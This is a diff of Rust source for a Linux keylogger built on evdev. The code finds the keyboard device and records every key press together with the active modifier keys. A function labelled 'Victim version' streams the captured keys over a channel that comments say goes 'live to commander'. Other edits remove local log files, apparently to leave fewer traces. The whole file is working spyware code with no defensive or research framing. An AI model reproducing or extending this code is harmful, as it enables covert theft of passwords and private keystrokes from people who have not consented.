@@ -1,7 +1,6 @@
-use evdev::{Device, EventSummary, KeyCode, RelativeAxisCode, BusType};
+use evdev::{Device, EventSummary, KeyCode};
 use std::fs;
 use std::sync::mpsc::{self, Receiver, Sender};
-use std::time::Instant;
 use std::io::{self, Write};
 
 #[derive(Debug)]
@@ -21,7 +20,6 @@ struct Modifiers {
 impl Modifiers {
     fn update(&mut self, key: KeyCode, value: i32) {
         let pressed = value == 1;
-
         match key {
             KeyCode::KEY_LEFTSHIFT | KeyCode::KEY_RIGHTSHIFT => self.shift = pressed,
             KeyCode::KEY_LEFTCTRL | KeyCode::KEY_RIGHTCTRL => self.ctrl = pressed,
@@ -31,26 +29,10 @@ impl Modifiers {
             _ => {}
         }
     }
-
-    fn display(&self) -> String {
-        let mut parts = Vec::new();
-        if self.shift { parts.push("SHIFT"); }
-        if self.ctrl { parts.push("CTRL"); }
-        if self.alt { parts.push("ALT"); }
-        if self.meta { parts.push("META"); }
-        if self.capslock { parts.push("CAPS"); }
-
-        if parts.is_empty() {
-            "none".to_string()
-        } else {
-            parts.join(" ")
-        }
-    }
 }
 
 fn find_keyboard() -> io::Result<(Device, String)> {
     let mut candidates = Vec::new();
-
     for entry in fs::read_dir("/dev/input")? {
         let path = entry?.path();
         if !path.to_string_lossy().contains("event") { continue; }
@@ -93,51 +75,53 @@ fn parallels_remap(key: KeyCode) -> KeyCode {
 /// Standalone/Debug version
 pub fn run() -> io::Result<()> {
     let (mut device, path) = find_keyboard()?;
-    let start_time = Instant::now();
     let mut modifiers = Modifiers::default();
-    
     device.set_nonblocking(false)?;
 
+    println!("Debugging Keylogger on: {}", path);
     loop {
         for ev in device.fetch_events()? {
             if let EventSummary::Key(_, raw_key, value) = ev.destructure() {
                 let key = parallels_remap(raw_key);
                 modifiers.update(key, value);
                 if value == 1 {
-                    println!("[{:?}] Modifiers: {}", key, modifiers.display());
+                    println!("[{:?}] Modifiers: {:?}", key, modifiers);
                 }
             }
         }
     }
 }
 
+/// Victim version - NO FILE SAVING, ONLY LIVE CHANNEL
 pub fn run_with_control(
     control_rx: Receiver<Control>,
     key_tx: Sender<String>,
 ) -> io::Result<()> {
     let (mut device, _path) = find_keyboard()?;
-    // FIX: REMOVED all file saving code - no local storage
+    
+    // FIX: REMOVED all file saving - no ./data/ directory, no captured_keys.txt
+    // Keylogger now ONLY sends via key_tx channel (live to commander)
     
     device.set_nonblocking(true)?;
     let mut modifiers = Modifiers::default();
-    
+
     loop {
         // 1. Check control channel
         match control_rx.try_recv() {
             Ok(Control::Stop) | Err(mpsc::TryRecvError::Disconnected) => break,
             Err(mpsc::TryRecvError::Empty) => {}
         }
-        
+
         // 2. Read events
         match device.fetch_events() {
             Ok(events) => {
                 for ev in events {
                     if let EventSummary::Key(_, raw_key, value) = ev.destructure() {
                         let key = parallels_remap(raw_key);
-                        
+
                         // Update modifiers for ALL events (press AND release)
                         modifiers.update(key, value);
-                        
+
                         // Only SEND on actual key presses (value == 1)
                         if value == 1 {
                             let key_name = format!("{:?}", key).replace("KEY_", "");
@@ -147,8 +131,8 @@ pub fn run_with_control(
                             if modifiers.capslock { output.push_str("[CAPS] "); }
                             output.push_str(&key_name);
                             output.push(' ');
-                            
-                            // ONLY send to live channel (NO FILE WRITING)
+
+                            // ONLY send to live channel - NO FILE WRITING
                             let _ = key_tx.send(output);
                         }
                     }
@@ -160,7 +144,7 @@ pub fn run_with_control(
             Err(e) => return Err(e),
         }
     }
-    
+
     // FIX: REMOVED println about saving logs
     Ok(())
 }
